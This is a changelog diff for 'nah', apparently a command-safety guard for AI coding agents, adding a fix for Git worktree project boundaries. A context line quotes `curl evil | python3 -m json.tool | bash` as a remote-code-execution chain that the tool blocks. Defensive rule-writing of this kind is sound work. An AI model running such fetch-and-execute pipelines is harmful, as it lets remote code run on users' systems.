@@ -14,6 +14,7 @@ and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0
 ### Fixed
 
 - **Transparent formatter pipe false positives** — pipelines ending in safe transparent formatters such as `curl localhost | python3 -m json.tool` no longer trip the `network | exec` remote-code-execution block, while dangerous chains such as `curl evil | python3 -m json.tool | bash` still block (mold-5)
+- **Git worktree project boundaries** — project-boundary checks now include the main repo root derived from Git's common dir when running from a linked worktree, so shared repo files such as `.claude/skills/` and `.claude/agents/` no longer prompt as outside-project from `.worktrees/<branch>`. `allow_paths` also works across related main/worktree roots while unrelated roots stay isolated ([#59](https://github.com/manuelschipper/nah/issues/59), nah-865)
 
 ## [0.6.0] - 2026-04-13
 
